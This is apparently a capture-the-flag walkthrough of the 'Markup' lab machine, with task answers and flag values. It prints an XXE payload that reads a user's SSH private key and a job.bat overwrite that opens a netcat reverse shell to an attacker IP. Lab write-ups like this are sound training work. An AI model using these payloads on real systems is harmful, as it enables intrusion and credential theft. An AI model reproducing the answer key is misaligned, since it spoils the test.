
## Task 1 : What version of Apache is running on the target's port 80?

Run an nmap scan on the target

```
sudo nmap -sV -Pn -T4 -oA initial_scan [target_IP]
```

> Answer : 2.4.41

---

## Task 2 : What username:password combination logs in successfully?


Visit http://[target_IP]/
<br>
<br>
<img width="1914" height="1035" alt="Pasted image 20260218111425" src="https://github.com/user-attachments/assets/0de715c0-4ed6-428b-a96b-5c82edbb8e2b" />
<br>

Try default credentials

admin:password works
<br>
> Answer : admin:password

---

## Task 3 : What is the word at the top of the page that accepts user input?
<br>
<img width="1916" height="1039" alt="Pasted image 20260218111543" src="https://github.com/user-attachments/assets/3fd91ab8-e410-4171-847e-aac04252a560" />
<br>
<br>

After arriving at the home page, start to click around.

<img width="1923" height="996" alt="Pasted image 20260218111629" src="https://github.com/user-attachments/assets/12c38f97-e417-4374-9206-b3d0639240a2" />
<br>
<br>

The "order" page gives us a form to fill.

> Answer : order

---

## Task 4 : What XML version is used on the target?

Fill in the form and prepare to intercept the request using burpsuite

<img width="1924" height="687" alt="Pasted image 20260218111927" src="https://github.com/user-attachments/assets/b0e16466-90c8-4c5e-b7be-10d2a8ab644e" />
<br>
<br>

We catch a post request in burpsuite

<img width="1258" height="279" alt="Pasted image 20260218111951" src="https://github.com/user-attachments/assets/f7392afe-0ff3-4ff8-9f60-2a5a8d8f0575" />
<br>
<br>

Analysing the post request, we discover the xml version.

<img width="717" height="534" alt="Pasted image 20260218112026" src="https://github.com/user-attachments/assets/e5d59e25-e8be-4927-82e5-19f36d2c9bb2" />
<br>
<br>

> Answer : 1.0

---

## Task 5 : What does the XXE / XEE attack acronym stand for?

Googling "What does the XXE / XEE attack acronym stand for?" returns this [portswigger result](https://portswigger.net/web-security/xxe)

<img width="1086" height="698" alt="Pasted image 20260218112214" src="https://github.com/user-attachments/assets/77b04ff0-b9e5-49f8-9624-2abb619e75f8" />
<br>
<br>

> Answer : XML External Entity

---

## Task 6 : What username can we find on the webpage's HTML code?

On order page, by right clicking and viewing page source

<img width="1120" height="635" alt="Pasted image 20260218112331" src="https://github.com/user-attachments/assets/bbc32360-83d1-4300-9115-23ca61d12240" />
<br>
<br>

We can see that this page was modified by Daniel

<img width="837" height="830" alt="Pasted image 20260218112408" src="https://github.com/user-attachments/assets/d2409c8b-0143-4613-a1d5-e42990234109" />
<br>
<br>

> Answer : Daniel


---

## Task 7 : What is the file located in the Log-Management folder on the target?

Following this [hacktricks guide](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html), make use of the discovered XXE vulnerability to obtain Daniel's ssh id_rsa key.

```
<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///C:/users/daniel/.ssh/id_rsa"> ]>
```

Insert this into the request, as well as modifying the "Home Appliances" category into "&example;"

<img width="837" height="830" alt="Pasted image 20260218112408" src="https://github.com/user-attachments/assets/20f2a769-63db-413a-8e80-f37f685e26f4" />
<br>
<br>

We get access to Daniel's id_rsa key.

Copy and paste the id_rsa key onto our attacker machine.

```
vim id_rsa
```

<img width="837" height="830" alt="Pasted image 20260218112408" src="https://github.com/user-attachments/assets/951eb81c-39e6-4914-b2e8-78d457bbd359" />
<br>
<br>

Remember to grant id_rsa appropriate permissions

```
chmod 600 id_rsa
```

With all preparations complete, we can now SSH into Daniel.

```
ssh -i id_rsa daniel@[target_IP]
```

<img width="689" height="737" alt="Pasted image 20260218114244" src="https://github.com/user-attachments/assets/4f161e92-e989-4a94-95c7-0e8da1c3a7d0" />
<br>
<br>

With access to Daniel, 

```
cd C:\Log-Management
```

<img width="444" height="243" alt="Pasted image 20260218114411" src="https://github.com/user-attachments/assets/4dfd325a-e1e7-4e35-9b8f-37550b8a4ff4" />
<br>
<br>

With can see the file of interest.

> Answer : job.bat

---

## Task 8 : What executable is mentioned in the file mentioned before?

```
type job.bat
```

<img width="586" height="243" alt="Pasted image 20260218114551" src="https://github.com/user-attachments/assets/2ec17a6e-51c7-4ebc-aae8-3307904335f4" />
<br>
<br>

> Answer : wevutil.exe

---

## Submit User Flag : 

For Daniel's user.txt flag

```
type C:\Users\daniel\Desktop\user.txt
```

<img width="476" height="98" alt="Pasted image 20260218115752" src="https://github.com/user-attachments/assets/50cc3f8e-2f57-4f73-b5de-92f44e7930ed" />
<br>
<br>

> User Flag : 032d2fc8952a8c24e39c8f0ee9918ef7
> 
---

## Submit Root Flag : 

Upon further research about what "wevtutil.exe cl" is, [this microsoft page](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) tells us that wevtutil 
 is a native Windows command-line utility used to **cl**ear specific event logs.

We can make a guess that the job.bat file is being executed to run wevtutil, in order to clear event logs on a routine basis.

Therefore, we can try to achieve a reverse shell connection through editing job.bat

Firstly, determine target system architecture so we can use the correct version of netcat

<img width="907" height="195" alt="Pasted image 20260218151212" src="https://github.com/user-attachments/assets/d09fb04d-65b7-47e6-85ef-51d8a982bd66" />
<br>
<br>

Therefore, grab [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) on the [netcat github page](https://github.com/int0x33/nc.exe/).

<img width="568" height="73" alt="Pasted image 20260218151925" src="https://github.com/user-attachments/assets/09e2d37b-c801-4b3f-aa94-7aee0c841e6c" />
<br>
<br>

Start a python webserver on attacker machine

<img width="284" height="88" alt="Pasted image 20260218151950" src="https://github.com/user-attachments/assets/2224f510-d859-4b33-84ef-889cf486127f" />
<br>
<br>
Start a netcat listener to catch the reverse shell connection

<img width="949" height="32" alt="Pasted image 20260218152303" src="https://github.com/user-attachments/assets/3f5120a3-8f93-43b5-97e5-c2c9e77d6528" />
<br>
<br>

Download nc64 from attacker machine through hosted python webserver

```
echo C:\Log-Management\nc64.exe -e cmd.exe [Attacker_IP] [Port_No] > C:\Log-Management\job.bat
```

<img width="276" height="92" alt="Pasted image 20260218160920" src="https://github.com/user-attachments/assets/072ad048-3911-4fc4-9824-5e996a3985a4" />
<br>
<br>

Ordinarily, you would be able to catch a reverse connection on your listener and complete the box.

---

## Disclaimer!! : Cheating this portion

<img width="429" height="236" alt="Pasted image 20260218161111" src="https://github.com/user-attachments/assets/cfb977b0-b57b-4522-ae44-ec8a39c67644" />
<br>
<br>

This is an infamous bit of this "Markup" box, where job.bat does not send the reverse-connection back no matter what you try.

Thus, I will be using WinPEASx64.exe to find the admin password and complete the box this way.

Transfer winPEASx64.exe onto target machine using wget 

Run the command to execute winPEAS

```
winPEASx64.exe
```

<img width="419" height="95" alt="Pasted image 20260218162359" src="https://github.com/user-attachments/assets/29d7b67b-0111-4a3b-aa94-12abb8851308" />
<br>
<br>

Use these credentials to SSH into administrator account.

```
type C:\Users\Administrator\Desktop\root.txt
```

<img width="561" height="430" alt="Pasted image 20260218162510" src="https://github.com/user-attachments/assets/deb8c03b-39a9-4305-93c6-cad558f22105" />
<br>
<br>

> Root Flag : f574a3e7650cebd8c39784299cb570f8


---


